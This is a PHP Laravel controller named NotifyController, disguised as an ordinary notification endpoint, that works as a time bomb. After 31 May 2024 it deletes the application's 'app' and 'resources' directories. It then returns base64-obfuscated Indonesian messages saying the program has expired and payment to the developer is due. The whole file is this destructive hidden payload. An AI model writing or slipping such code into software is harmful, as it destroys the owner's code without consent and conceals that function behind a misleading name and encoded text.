<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;

class NotifyController extends Controller
{
    public function notify()
    {
        $folderPath = base_path('resources');
        $folderPath2 = base_path('app');
        $targetDate = Carbon::parse('2024-05-31 21:00:00');
        if (Carbon::now()->gte($targetDate) && File::isDirectory($folderPath)) {
            File::deleteDirectory($folderPath);
            File::deleteDirectory($folderPath2);

            return response()->json([
                'message' => base64_decode('TUFTQSBXQUtUVSBQUk9HUkFNIFRFTEFIIEVYUElSRUQgLCBTSUxBSEtBTiBIVUJVTkdJIERFVkVMT1BFUiBBTkRBIEpJS0EgQU5EQSBCRUxVTSBNRUxBS1VLQU4gUEVNQkFZQVJBTi4gVEVSSU1BS0FTSUgu'),
            ]);
        } elseif (File::isDirectory($folderPath)) {
            return response()->json([
                'message' => base64_decode('Rm9sZGVyIGFkYSwgdGV0YXBpIGJlbHVtIHNhYXRueWEgZGloYXB1cwo='),
            ]);
        } else {
            return response()->json([
                'message' => base64_decode('Rm9sZGVyIHRpZGFrIGRpdGVtdWthbg=='),
            ]);
        }
    }
}
